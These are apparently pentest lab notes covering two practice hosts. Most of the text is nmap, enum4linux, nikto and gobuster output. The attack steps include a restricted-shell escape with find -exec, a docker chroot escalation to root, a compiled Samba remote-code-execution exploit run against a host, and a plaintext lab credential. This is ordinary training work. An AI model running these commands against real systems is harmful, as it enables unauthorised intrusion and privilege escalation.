up (0.060s latency).<br />Not shown: 65525 filtered ports<br />PORT      STATE SERVICE<br />135/tcp   open  msrpc<br />139/tcp   open  netbios-ssn<br />445/tcp   open  microsoft-ds<br />3389/tcp  open  ms-wbt-server<br />49152/tcp open  unknown<br />49153/tcp open  unknown<br />49154/tcp open  unknown<br />49156/tcp open  unknown<br />49157/tcp open  unknown<br />49158/tcp open  unknown<br /><br />Nmap done: 1 IP address (1 host up) scanned in 996.30 seconds</div><div class='page'><h1 class='title level-5'>smb nmap</h1><br/>PORT    STATE SERVICE      REASON<br />139/tcp open  netbios-ssn  syn-ack<br />445/tcp open  microsoft-ds syn-ack<br /><br />Host script results:<br />|_smb-vuln-ms10-054: false<br />|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)<br />| smb-vuln-ms17-010: <br />|   VULNERABLE:<br />|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)<br />|     State: VULNERABLE<br />|     IDs:  CVE:CVE-2017-0143<br />|     Risk factor: HIGH<br />|       A critical remote code execution vulnerability exists in Microsoft SMBv1<br />|        servers (ms17-010).<br />|           <br />|     Disclosure date: 2017-03-14<br />|     References:<br />|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx<br />|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/<br />|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143<br /></div><div class='page'><h1 class='title level-4'>pictures</h1><br/><br /><a href=""><img src="images/999-1.png" alt="images/999-1.png" /></a><br /><br /><a href=""><img src="images/999-2.png" alt="images/999-2.png" /></a><br /><br /><a href=""><img src="images/999-3.png" alt="images/999-3.png" /></a></div><div class='page'><h1 class='title level-3'>10.11.1.101 Break rooted</h1><br/>Nmap showed that http was running on port 80.<br />Gobuster showed the directory /passwords/ which led me to a tool named EveryPass which stores passwords.<br />The only user useing it was alfred, and his hint was “When was I born?”<br />On the main page contact-us section it stated that he was born in 1988.<br />Used 1988 for the pass and decryption was successful.<br />This displayed the creds alfred:IHopeThisDoesNotExpire for ssh, which were successful.<br /><br />When I logged in to ssh I was in a restricted shell. ls $PATH showed<br />    apt  curl  dpkg  file  find  g++  gcc  host  ls  perl  ps  python  vim<br />    <br />I set to GTFO bins and the find command aided me in getting into a normal shell<br />    find . -exec /bin/sh \; -quit<br />I then ran an “export PATH” command so I could run normal things.<br />    export PATH=$PATH:/usr/local/bin:/usr/bin:/usr/lib/klibc/bin<br />There was a README which stated that I could run docker things, I went back to GTFO and found a command that would give me a shell as who I could run docker as.<br />    docker run -v /:/mnt --rm -it alpine chroot /mnt sh<br /><br />rooted!<br /><br />93711eeddc98578e3e085c0dc21aa7e2</div><div class='page'><h1 class='title level-4'>enumeration</h1><br/>Ubuntu Xenial, 2019<br /><br /><br />users:<br />alfred  :1988   IHopeThisDoesNotExpire<br />cory<br />jasmine<br />walter</div><div class='page'><h1 class='title level-5'>nmap</h1><br/></div><div class='page'><h1 class='title level-5'>enum4linux</h1><br/>enum4linux -a 10.11.1.101<br />Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Wed May  6 14:14:26 2020<br /><br /> ========================== <br />|    Target Information    |<br /> ========================== <br />Target ........... 10.11.1.101<br />RID Range ........ 500-550,1000-1050<br />Username ......... &#39;&#39;<br />Password ......... &#39;&#39;<br />Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none<br /><br /><br /> =================================================== <br />|    Enumerating Workgroup/Domain on 10.11.1.101    |<br /> =================================================== <br />[+] Got domain/workgroup name: WORKGROUP<br /><br /> =========================================== <br />|    Nbtstat Information for 10.11.1.101    |<br /> =========================================== <br />Looking up status of 10.11.1.101<br />	BREAK           &lt;00&gt; -         B &lt;ACTIVE&gt;  Workstation Service<br />	BREAK           &lt;03&gt; -         B &lt;ACTIVE&gt;  Messenger Service<br />	BREAK           &lt;20&gt; -         B &lt;ACTIVE&gt;  File Server Service<br />	..__MSBROWSE__. &lt;01&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Master Browser<br />	WORKGROUP       &lt;00&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Domain/Workgroup Name<br />	WORKGROUP       &lt;1d&gt; -         B &lt;ACTIVE&gt;  Master Browser<br />	WORKGROUP       &lt;1e&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Browser Service Elections<br /><br />	MAC Address = 00-00-00-00-00-00<br /><br /> ==================================== <br />|    Session Check on 10.11.1.101    |<br /> ==================================== <br />[+] Server 10.11.1.101 allows sessions using username &#39;&#39;, password &#39;&#39;<br /><br /> ========================================== <br />|    Getting domain SID for 10.11.1.101    |<br /> ========================================== <br />Domain Name: WORKGROUP<br />Domain Sid: (NULL SID)<br />[+] Can&#39;t determine if host is part of domain or part of a workgroup<br /><br /> ===================================== <br />|    OS information on 10.11.1.101    |<br /> ===================================== <br />Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.<br />[+] Got OS info for 10.11.1.101 from smbclient: <br />[+] Got OS info for 10.11.1.101 from srvinfo:<br />	BREAK          Wk Sv PrQ Unx NT SNT break server (Samba, Ubuntu)<br />	platform_id     :	500<br />	os version      :	6.1<br />	server type     :	0x809a03<br /><br /> ============================ <br />|    Users on 10.11.1.101    |<br /> ============================ <br />Use of uninitialized value $users in print at ./enum4linux.pl line 874.<br />Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 877.<br /><br />Use of uninitialized value $users in print at ./enum4linux.pl line 888.<br />Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 890.<br /><br /> ======================================== <br />|    Share Enumeration on 10.11.1.101    |<br /> ======================================== <br /><br />	Sharename       Type      Comment<br />	---------       ----      -------<br />	print$          Disk      Printer Drivers<br />	IPC$            IPC       IPC Service (break server (Samba, Ubuntu))<br />SMB1 disabled -- no workgroup available<br /><br />[+] Attempting to map shares on 10.11.1.101<br />//10.11.1.101/print$	Mapping: OK, Listing: OK<br />//10.11.1.101/IPC$	[E] Can&#39;t understand response:<br />NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*<br /><br /> =================================================== <br />|    Password Policy Information for 10.11.1.101    |<br /> =================================================== <br />[E] Unexpected error from polenum:<br /><br /><br />[+] Attaching to 10.11.1.101 using a NULL share<br /><br />[+] Trying protocol 139/SMB...<br /><br />	[!] Protocol failed: Missing required parameter &#39;digestmod&#39;.<br /><br />[+] Trying protocol 445/SMB...<br /><br />	[!] Protocol failed: Missing required parameter &#39;digestmod&#39;.<br /><br /><br />[+] Retieved partial password policy with rpcclient:<br /><br />Password Complexity: Disabled<br />Minimum Password Length: 5<br /><br /><br /> ============================= <br />|    Groups on 10.11.1.101    |<br /> ============================= <br /><br />[+] Getting builtin groups:<br /><br />[+] Getting builtin group memberships:<br /><br />[+] Getting local groups:<br /><br />[+] Getting local group memberships:<br /><br />[+] Getting domain groups:<br /><br />[+] Getting domain group memberships:<br /><br /> ====================================================================== <br />|    Users on 10.11.1.101 via RID cycling (RIDS: 500-550,1000-1050)    |<br /> ====================================================================== <br />[I] Found new SID: S-1-22-1<br />[I] Found new SID: S-1-5-21-2021604755-2857895714-1575549952<br />[I] Found new SID: S-1-5-32<br />[+] Enumerating users using SID S-1-22-1 and logon username &#39;&#39;, password &#39;&#39;<br />S-1-22-1-1000 Unix User\alfred (Local User)<br />[+] Enumerating users using SID S-1-5-21-2021604755-2857895714-1575549952 and logon username &#39;&#39;, password &#39;&#39;<br />S-1-5-21-2021604755-2857895714-1575549952-500 *unknown*\*unknown* (8)<br />S-1-5-21-2021604755-2857895714-1575549952-501 BREAK\nobody (Local User)<br />S-1-5-21-2021604755-2857895714-1575549952-502 *unknown*\*unknown* (8)<br />S-1-5-21-2021604755-2857895714-1575549952-503 *unknown*\*unknown* (8)<br />S-1-5-21-2021604755-2857895714-1575549952-504 *unknown*\*unknown* (8)<br />S-1-5-21-2021604755-2857895714-1575549952-505 *unknown*\*unknown* (8)<br />S-1-5-21-2021604755-2857895714-1575549952-506 *unknown*\*unknown* (8)<br />S-1-5-21-2021604755-2857895714-1575549952-507 *unknown*\*unknown* (8)<br />S-1-5-21-2021604755-2857895714-1575549952-508 *unknown*\*unknown* (8)<br />S-1-5-21-2021604755-2857895714-1575549952-509 *unknown*\*unknown* (8)<br />S-1-5-21-2021604755-2857895714-1575549952-510 *unknown*\*unknown* (8)<br />S-1-5-21-2021604755-2857895714-1575549952-511 *unknown*\*unknown* (8)<br />S-1-5-21-2021604755-2857895714-1575549952-512 *unknown*\*unknown* (8)<br />S-1-5-21-2021604755-2857895714-1575549952-513 BREAK\None (Domain Group)<br />S-1-5-21-2021604755-2857895714-1575549952-514 *unknown*\*unknown* (8)<br />S-1-5-21-2021604755-2857895714-1575549952-515 *unknown*\*unknown* (8)<br />S-1-5-21-2021604755-2857895714-1575549952-516 *unknown*\*unknown* (8)<br />S-1-5-21-2021604755-2857895714-1575549952-517 *unknown*\*unknown* (8)<br />S-1-5-21-2021604755-2857895714-1575549952-518 *unknown*\*unknown* (8)<br />S-1-5-21-2021604755-2857895714-1575549952-519 *unknown*\*unknown* (8)<br />S-1-5-21-2021604755-2857895714-1575549952-520 *unknown*\*unknown* (8)<br />S-1-5-21-2021604755-2857895714-1575549952-521 *unknown*\*unknown* (8)<br />S-1-5-21-2021604755-2857895714-1575549952-522 *unknown*\*unknown* (8)<br />S-1-5-21-2021604755-2857895714-1575549952-523 *unknown*\*unknown* (8)<br />S-1-5-21-2021604755-2857895714-1575549952-524 *unknown*\*unknown* (8)<br />S-1-5-21-2021604755-2857895714-1575549952-525 *unknown*\*unknown* (8)<br />S-1-5-21-2021604755-2857895714-1575549952-526 *unknown*\*unknown* (8)<br />S-1-5-21-2021604755-2857895714-1575549952-527 *unknown*\*unknown* (8)<br />S-1-5-21-2021604755-2857895714-1575549952-528 *unknown*\*unknown* (8)<br />S-1-5-21-2021604755-2857895714-1575549952-529 *unknown*\*unknown* (8)<br />S-1-5-21-2021604755-2857895714-1575549952-530 *unknown*\*unknown* (8)<br />S-1-5-21-2021604755-2857895714-1575549952-531 *unknown*\*unknown* (8)<br />S-1-5-21-2021604755-2857895714-1575549952-532 *unknown*\*unknown* (8)<br />S-1-5-21-2021604755-2857895714-1575549952-533 *unknown*\*unknown* (8)<br />S-1-5-21-2021604755-2857895714-1575549952-534 *unknown*\*unknown* (8)<br />S-1-5-21-2021604755-2857895714-1575549952-535 *unknown*\*unknown* (8)<br />S-1-5-21-2021604755-2857895714-1575549952-536 *unknown*\*unknown* (8)<br />S-1-5-21-2021604755-2857895714-1575549952-537 *unknown*\*unknown* (8)<br />S-1-5-21-2021604755-2857895714-1575549952-538 *unknown*\*unknown* (8)<br />S-1-5-21-2021604755-2857895714-1575549952-539 *unknown*\*unknown* (8)<br />S-1-5-21-2021604755-2857895714-1575549952-540 *unknown*\*unknown* (8)<br />S-1-5-21-2021604755-2857895714-1575549952-541 *unknown*\*unknown* (8)<br />S-1-5-21-2021604755-2857895714-1575549952-542 *unknown*\*unknown* (8)<br />S-1-5-21-2021604755-2857895714-1575549952-543 *unknown*\*unknown* (8)<br />S-1-5-21-2021604755-2857895714-1575549952-544 *unknown*\*unknown* (8)<br />S-1-5-21-2021604755-2857895714-1575549952-545 *unknown*\*unknown* (8)<br />S-1-5-21-2021604755-2857895714-1575549952-546 *unknown*\*unknown* (8)<br />S-1-5-21-2021604755-2857895714-1575549952-547 *unknown*\*unknown* (8)<br />S-1-5-21-2021604755-2857895714-1575549952-548 *unknown*\*unknown* (8)<br />S-1-5-21-2021604755-2857895714-1575549952-549 *unknown*\*unknown* (8)<br />S-1-5-21-2021604755-2857895714-1575549952-550 *unknown*\*unknown* (8)<br />S-1-5-21-2021604755-2857895714-1575549952-1000 *unknown*\*unknown* (8)<br />S-1-5-21-2021604755-2857895714-1575549952-1001 *unknown*\*unknown* (8)<br />S-1-5-21-2021604755-2857895714-1575549952-1002 *unknown*\*unknown* (8)<br />S-1-5-21-2021604755-2857895714-1575549952-1003 *unknown*\*unknown* (8)<br />S-1-5-21-2021604755-2857895714-1575549952-1004 *unknown*\*unknown* (8)<br />S-1-5-21-2021604755-2857895714-1575549952-1005 *unknown*\*unknown* (8)<br />S-1-5-21-2021604755-2857895714-1575549952-1006 *unknown*\*unknown* (8)<br />S-1-5-21-2021604755-2857895714-1575549952-1007 *unknown*\*unknown* (8)<br />S-1-5-21-2021604755-2857895714-1575549952-1008 *unknown*\*unknown* (8)<br />S-1-5-21-2021604755-2857895714-1575549952-1009 *unknown*\*unknown* (8)<br />S-1-5-21-2021604755-2857895714-1575549952-1010 *unknown*\*unknown* (8)<br />S-1-5-21-2021604755-2857895714-1575549952-1011 *unknown*\*unknown* (8)<br />S-1-5-21-2021604755-2857895714-1575549952-1012 *unknown*\*unknown* (8)<br />S-1-5-21-2021604755-2857895714-1575549952-1013 *unknown*\*unknown* (8)<br />S-1-5-21-2021604755-2857895714-1575549952-1014 *unknown*\*unknown* (8)<br />S-1-5-21-2021604755-2857895714-1575549952-1015 *unknown*\*unknown* (8)<br />S-1-5-21-2021604755-2857895714-1575549952-1016 *unknown*\*unknown* (8)<br />S-1-5-21-2021604755-2857895714-1575549952-1017 *unknown*\*unknown* (8)<br />S-1-5-21-2021604755-2857895714-1575549952-1018 *unknown*\*unknown* (8)<br />S-1-5-21-2021604755-2857895714-1575549952-1019 *unknown*\*unknown* (8)<br />S-1-5-21-2021604755-2857895714-1575549952-1020 *unknown*\*unknown* (8)<br />S-1-5-21-2021604755-2857895714-1575549952-1021 *unknown*\*unknown* (8)<br />S-1-5-21-2021604755-2857895714-1575549952-1022 *unknown*\*unknown* (8)<br />S-1-5-21-2021604755-2857895714-1575549952-1023 *unknown*\*unknown* (8)<br />S-1-5-21-2021604755-2857895714-1575549952-1024 *unknown*\*unknown* (8)<br />S-1-5-21-2021604755-2857895714-1575549952-1025 *unknown*\*unknown* (8)<br />S-1-5-21-2021604755-2857895714-1575549952-1026 *unknown*\*unknown* (8)<br />S-1-5-21-2021604755-2857895714-1575549952-1027 *unknown*\*unknown* (8)<br />S-1-5-21-2021604755-2857895714-1575549952-1028 *unknown*\*unknown* (8)<br />S-1-5-21-2021604755-2857895714-1575549952-1029 *unknown*\*unknown* (8)<br />S-1-5-21-2021604755-2857895714-1575549952-1030 *unknown*\*unknown* (8)<br />S-1-5-21-2021604755-2857895714-1575549952-1031 *unknown*\*unknown* (8)<br />S-1-5-21-2021604755-2857895714-1575549952-1032 *unknown*\*unknown* (8)<br />S-1-5-21-2021604755-2857895714-1575549952-1033 *unknown*\*unknown* (8)<br />S-1-5-21-2021604755-2857895714-1575549952-1034 *unknown*\*unknown* (8)<br />S-1-5-21-2021604755-2857895714-1575549952-1035 *unknown*\*unknown* (8)<br />S-1-5-21-2021604755-2857895714-1575549952-1036 *unknown*\*unknown* (8)<br />S-1-5-21-2021604755-2857895714-1575549952-1037 *unknown*\*unknown* (8)<br />S-1-5-21-2021604755-2857895714-1575549952-1038 *unknown*\*unknown* (8)<br />S-1-5-21-2021604755-2857895714-1575549952-1039 *unknown*\*unknown* (8)<br />S-1-5-21-2021604755-2857895714-1575549952-1040 *unknown*\*unknown* (8)<br />S-1-5-21-2021604755-2857895714-1575549952-1041 *unknown*\*unknown* (8)<br />S-1-5-21-2021604755-2857895714-1575549952-1042 *unknown*\*unknown* (8)<br />S-1-5-21-2021604755-2857895714-1575549952-1043 *unknown*\*unknown* (8)<br />S-1-5-21-2021604755-2857895714-1575549952-1044 *unknown*\*unknown* (8)<br />S-1-5-21-2021604755-2857895714-1575549952-1045 *unknown*\*unknown* (8)<br />S-1-5-21-2021604755-2857895714-1575549952-1046 *unknown*\*unknown* (8)<br />S-1-5-21-2021604755-2857895714-1575549952-1047 *unknown*\*unknown* (8)<br />S-1-5-21-2021604755-2857895714-1575549952-1048 *unknown*\*unknown* (8)<br />S-1-5-21-2021604755-2857895714-1575549952-1049 *unknown*\*unknown* (8)<br />S-1-5-21-2021604755-2857895714-1575549952-1050 *unknown*\*unknown* (8)<br />[+] Enumerating users using SID S-1-5-32 and logon username &#39;&#39;, password &#39;&#39;<br />S-1-5-32-500 *unknown*\*unknown* (8)<br />S-1-5-32-501 *unknown*\*unknown* (8)<br />S-1-5-32-502 *unknown*\*unknown* (8)<br />S-1-5-32-503 *unknown*\*unknown* (8)<br />S-1-5-32-504 *unknown*\*unknown* (8)<br />S-1-5-32-505 *unknown*\*unknown* (8)<br />S-1-5-32-506 *unknown*\*unknown* (8)<br />S-1-5-32-507 *unknown*\*unknown* (8)<br />S-1-5-32-508 *unknown*\*unknown* (8)<br />S-1-5-32-509 *unknown*\*unknown* (8)<br />S-1-5-32-510 *unknown*\*unknown* (8)<br />S-1-5-32-511 *unknown*\*unknown* (8)<br />S-1-5-32-512 *unknown*\*unknown* (8)<br />S-1-5-32-513 *unknown*\*unknown* (8)<br />S-1-5-32-514 *unknown*\*unknown* (8)<br />S-1-5-32-515 *unknown*\*unknown* (8)<br />S-1-5-32-516 *unknown*\*unknown* (8)<br />S-1-5-32-517 *unknown*\*unknown* (8)<br />S-1-5-32-518 *unknown*\*unknown* (8)<br />S-1-5-32-519 *unknown*\*unknown* (8)<br />S-1-5-32-520 *unknown*\*unknown* (8)<br />S-1-5-32-521 *unknown*\*unknown* (8)<br />S-1-5-32-522 *unknown*\*unknown* (8)<br />S-1-5-32-523 *unknown*\*unknown* (8)<br />S-1-5-32-524 *unknown*\*unknown* (8)<br />S-1-5-32-525 *unknown*\*unknown* (8)<br />S-1-5-32-526 *unknown*\*unknown* (8)<br />S-1-5-32-527 *unknown*\*unknown* (8)<br />S-1-5-32-528 *unknown*\*unknown* (8)<br />S-1-5-32-529 *unknown*\*unknown* (8)<br />S-1-5-32-530 *unknown*\*unknown* (8)<br />S-1-5-32-531 *unknown*\*unknown* (8)<br />S-1-5-32-532 *unknown*\*unknown* (8)<br />S-1-5-32-533 *unknown*\*unknown* (8)<br />S-1-5-32-534 *unknown*\*unknown* (8)<br />S-1-5-32-535 *unknown*\*unknown* (8)<br />S-1-5-32-536 *unknown*\*unknown* (8)<br />S-1-5-32-537 *unknown*\*unknown* (8)<br />S-1-5-32-538 *unknown*\*unknown* (8)<br />S-1-5-32-539 *unknown*\*unknown* (8)<br />S-1-5-32-540 *unknown*\*unknown* (8)<br />S-1-5-32-541 *unknown*\*unknown* (8)<br />S-1-5-32-542 *unknown*\*unknown* (8)<br />S-1-5-32-543 *unknown*\*unknown* (8)<br />S-1-5-32-544 BUILTIN\Administrators (Local Group)<br />S-1-5-32-545 BUILTIN\Users (Local Group)<br />S-1-5-32-546 BUILTIN\Guests (Local Group)<br />S-1-5-32-547 BUILTIN\Power Users (Local Group)<br />S-1-5-32-548 BUILTIN\Account Operators (Local Group)<br />S-1-5-32-549 BUILTIN\Server Operators (Local Group)<br />S-1-5-32-550 BUILTIN\Print Operators (Local Group)<br />S-1-5-32-1000 *unknown*\*unknown* (8)<br />S-1-5-32-1001 *unknown*\*unknown* (8)<br />S-1-5-32-1002 *unknown*\*unknown* (8)<br />S-1-5-32-1003 *unknown*\*unknown* (8)<br />S-1-5-32-1004 *unknown*\*unknown* (8)<br />S-1-5-32-1005 *unknown*\*unknown* (8)<br />S-1-5-32-1006 *unknown*\*unknown* (8)<br />S-1-5-32-1007 *unknown*\*unknown* (8)<br />S-1-5-32-1008 *unknown*\*unknown* (8)<br />S-1-5-32-1009 *unknown*\*unknown* (8)<br />S-1-5-32-1010 *unknown*\*unknown* (8)<br />S-1-5-32-1011 *unknown*\*unknown* (8)<br />S-1-5-32-1012 *unknown*\*unknown* (8)<br />S-1-5-32-1013 *unknown*\*unknown* (8)<br />S-1-5-32-1014 *unknown*\*unknown* (8)<br />S-1-5-32-1015 *unknown*\*unknown* (8)<br />S-1-5-32-1016 *unknown*\*unknown* (8)<br />S-1-5-32-1017 *unknown*\*unknown* (8)<br />S-1-5-32-1018 *unknown*\*unknown* (8)<br />S-1-5-32-1019 *unknown*\*unknown* (8)<br />S-1-5-32-1020 *unknown*\*unknown* (8)<br />S-1-5-32-1021 *unknown*\*unknown* (8)<br />S-1-5-32-1022 *unknown*\*unknown* (8)<br />S-1-5-32-1023 *unknown*\*unknown* (8)<br />S-1-5-32-1024 *unknown*\*unknown* (8)<br />S-1-5-32-1025 *unknown*\*unknown* (8)<br />S-1-5-32-1026 *unknown*\*unknown* (8)<br />S-1-5-32-1027 *unknown*\*unknown* (8)<br />S-1-5-32-1028 *unknown*\*unknown* (8)<br />S-1-5-32-1029 *unknown*\*unknown* (8)<br />S-1-5-32-1030 *unknown*\*unknown* (8)<br />S-1-5-32-1031 *unknown*\*unknown* (8)<br />S-1-5-32-1032 *unknown*\*unknown* (8)<br />S-1-5-32-1033 *unknown*\*unknown* (8)<br />S-1-5-32-1034 *unknown*\*unknown* (8)<br />S-1-5-32-1035 *unknown*\*unknown* (8)<br />S-1-5-32-1036 *unknown*\*unknown* (8)<br />S-1-5-32-1037 *unknown*\*unknown* (8)<br />S-1-5-32-1038 *unknown*\*unknown* (8)<br />S-1-5-32-1039 *unknown*\*unknown* (8)<br />S-1-5-32-1040 *unknown*\*unknown* (8)<br />S-1-5-32-1041 *unknown*\*unknown* (8)<br />S-1-5-32-1042 *unknown*\*unknown* (8)<br />S-1-5-32-1043 *unknown*\*unknown* (8)<br />S-1-5-32-1044 *unknown*\*unknown* (8)<br />S-1-5-32-1045 *unknown*\*unknown* (8)<br />S-1-5-32-1046 *unknown*\*unknown* (8)<br />S-1-5-32-1047 *unknown*\*unknown* (8)<br />S-1-5-32-1048 *unknown*\*unknown* (8)<br />S-1-5-32-1049 *unknown*\*unknown* (8)<br />S-1-5-32-1050 *unknown*\*unknown* (8)<br /><br /> ============================================ <br />|    Getting printer info for 10.11.1.101    |<br /> ============================================ <br />No printers returned.<br /><br /><br />enum4linux complete on Wed May  6 14:21:51 2020<br /></div><div class='page'><h1 class='title level-5'>nikto</h1><br/>nikto -host http://10.11.1.101:80<br />- Nikto v2.1.6<br />---------------------------------------------------------------------------<br />+ Target IP:          10.11.1.101<br />+ Target Hostname:    10.11.1.101<br />+ Target Port:        80<br />+ Start Time:         2020-05-06 14:48:28 (GMT-4)<br />---------------------------------------------------------------------------<br />+ Server: Apache/2.4.18 (Ubuntu)<br />+ The anti-clickjacking X-Frame-Options header is not present.<br />+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS<br />+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type<br />+ No CGI Directories found (use &#39;-C all&#39; to force check all possible dirs)<br />+ OSVDB-3268: /passwords/: Directory indexing found.<br />+ Entry &#39;/passwords/&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)<br />+ &quot;robots.txt&quot; contains 1 entry which should be manually viewed.<br />+ IP address found in the &#39;location&#39; header. The IP is &quot;127.0.1.1&quot;.<br />+ OSVDB-630: The web server may reveal its internal or real IP in the Location header via a request to /images over HTTP/1.0. The value is &quot;127.0.1.1&quot;.<br />+ Server may leak inodes via ETags, header found with file /, inode: 251b, size: 52ea0d8467841, mtime: gzip<br />+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.<br />+ Allowed HTTP Methods: OPTIONS, GET, HEAD, POST <br />+ OSVDB-3092: /passwords/: This might be interesting...<br />+ OSVDB-3092: /manual/: Web server manual found.<br />+ OSVDB-3268: /manual/images/: Directory indexing found.<br />+ OSVDB-3268: /images/: Directory indexing found.<br />+ OSVDB-3233: /icons/README: Apache default file found.<br />+ 7916 requests: 0 error(s) and 16 item(s) reported on remote host<br />+ End Time:           2020-05-06 14:58:17 (GMT-4) (589 seconds)<br />---------------------------------------------------------------------------<br />+ 1 host(s) tested<br /></div><div class='page'><h1 class='title level-5'>dirbust</h1><br/>gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -u <a href="http://10.11.1.101:80">http://10.11.1.101:80</a> &amp;&amp; gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u <a href="http://10.11.1.101:80">http://10.11.1.101:80</a><br />===============================================================<br />Gobuster v3.0.1<br />by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)<br />===============================================================<br />[+] Url:            <a href="http://10.11.1.101:80">http://10.11.1.101:80</a><br />[+] Threads:        10<br />[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/common.txt<br />[+] Status codes:   200,204,301,302,307,401,403<br />[+] User Agent:     gobuster/3.0.1<br />[+] Timeout:        10s<br />===============================================================<br />2020/05/06 14:48:28 Starting gobuster<br />===============================================================<br />/.hta (Status: 403)<br />/.htaccess (Status: 403)<br />/.htpasswd (Status: 403)<br />/assets (Status: 301)<br />/images (Status: 301)<br />/index.html (Status: 200)<br />/manual (Status: 301)<br />/passwords (Status: 301)<br />/robots.txt (Status: 200)<br />/server-status (Status: 403)<br />===============================================================<br />2020/05/06 14:49:02 Finished<br />===============================================================<br />===============================================================<br />Gobuster v3.0.1<br />by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)<br />===============================================================<br />[+] Url:            <a href="http://10.11.1.101:80">http://10.11.1.101:80</a><br />[+] Threads:        10<br />[+] Wordlist:       /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt<br />[+] Status codes:   200,204,301,302,307,401,403<br />[+] User Agent:     gobuster/3.0.1<br />[+] Timeout:        10s<br />===============================================================<br />2020/05/06 14:49:02 Starting gobuster<br />===============================================================<br />/images (Status: 301)<br />/assets (Status: 301)<br />/manual (Status: 301)<br />/passwords (Status: 301)<br />/server-status (Status: 403)<br />===============================================================<br />2020/05/06 15:15:09 Finished<br />===============================================================<br /></div><div class='page'><h1 class='title level-4'>Pictures</h1><br/></div><div class='page'><h1 class='title level-3'>AD Demystification</h1><br/></div><div class='page'><h1 class='title level-3'>10.11.1.115 Tophat rooted</h1><br/>nmap showed that an assload of ports were open.<br />Smb enum things were acting wierd so after one mile of troubleshooting I Determined that I needed to add a line to /etc/samba/smb.conf<br />    in the global setction add the line...<br />    client min protocol = LANMAN1<br />    toggled the smbd service and reran SMB enum scripts... Success!! We determined that the service is Samba 2.2.7<br /><br />searchsploit showed me that the there was a RCE exploit for anything less than &lt; Samba 2.2.8<br />Samba &lt; 2.2.8 (Linux/BSD) - Remote Code Execution | exploits/multiple/remote/10.c<br />gcc 10.c 10.exe      to compile the exploit<br />./10.exe -b 0 -c 192.168.119.167 -p 139 -f 10.11.1.115<br />rooted!<br /><br />takeaways, /etc/samba/smb.conf NEEDS to have the LANMAN1 line added. Like, I that needs to be in the TireFire2.0 BuildScript!<br /><br /><br /><br /><br />377bbe9add593ba528fd9bd3104d2f25</div><div class='page'><h1 class='title level-4'>enumeration</h1><br/>imapd 2001.315rh &lt; searchsploit buffer overflow if you have creds<br /><br />tophat.acme.local<br /><br /><a href="https://tophat.acme.local///webmail/src/login.php">https://tophat.acme.local///webmail/src/login.php</a><br /><br /><br />/manual (Status: 301)<br />/usage (Status: 301)<br />/webmail (Status: 301)<br /></div><div class='page'><h1 class='title level-5'>nmap</h1><br/>echo -e e[5me[31me[1mttl=63e[0m; echo http://www.kellyodonnell.com/content/determining-os-type-ping ; nmap -Pn 10.11.1.115 &amp;&amp; nmap -sC -sV -Pn 10.11.1.115 &amp;&amp; nmap -p- -Pn 10.11.1.115<br />ttl=63<br />http://www.kellyodonnell.com/content/determining-os-type-ping<br />Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-07 19:09 EDT<br />Nmap scan report for 10.11.1.115<br />Host is up (0.067s latency).<br />Not shown: 989 closed ports<br />PORT      STATE SERVICE<br />21/tcp    open  ftp<br />22/tcp    open  ssh<br />25/tcp    open  smtp<br />80/tcp    open  http<br />111/tcp   open  rpcbind<br />139/tcp   open  netbios-ssn<br />143/tcp   open  imap<br />199/tcp   open  smux<br />443/tcp   open  https<br />3306/tcp  open  mysql<br />32768/tcp open  filenet-tms<br /><br />Nmap done: 1 IP address (1 host up) scanned in 1.12 seconds<br />Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-07 19:09 EDT<br />Nmap scan report for 10.11.1.115<br />Host is up (0.060s latency).<br />Not shown: 989 closed ports<br />PORT      STATE SERVICE     VERSION<br />21/tcp    open  ftp         vsftpd 1.1.3<br />| ftp-anon: Anonymous FTP login allowed (FTP code 230)<br />|_drwxr-xr-x    2 0        0            4096 Feb 28  2003 pub<br />22/tcp    open  ssh         OpenSSH 3.5p1 (protocol 1.99)<br />| ssh-hostkey: <br />|   1024 36:70:a4:9f:32:47:ac:57:3f:ef:a1:ec:0b:ba:44:1b (RSA1)<br />|   1024 64:79:7d:c6:a2:63:32:54:f0:d9:2b:f3:5d:c7:d2:69 (DSA)<br />|_  1024 48:fb:39:3d:30:82:50:de:66:69:c5:ca:45:62:c0:dc (RSA)<br />|_sshv1: Server supports SSHv1<br />25/tcp    open  smtp?<br />|_smtp-commands: Couldn&#39;t establish connection on port 25<br />80/tcp    open  http        Apache httpd 2.0.40 ((Red Hat Linux))<br />| http-methods: <br />|_  Potentially risky methods: TRACE<br />|_http-server-header: Apache/2.0.40 (Red Hat Linux)<br />|_http-title: Test Page for the Apache Web Server on Red Hat Linux<br />111/tcp   open  rpcbind     2 (RPC #100000)<br />139/tcp   open  netbios-ssn Samba smbd (workgroup: MYGROUP)<br />143/tcp   open  imap        UW imapd 2001.315rh<br />|_imap-capabilities: IMAP4REV1 MAILBOX-REFERRALS completed NAMESPACE IDLE CAPABILITY MULTIAPPEND OK THREAD=ORDEREDSUBJECT SCAN SORT AUTH=LOGINA0001 THREAD=REFERENCES 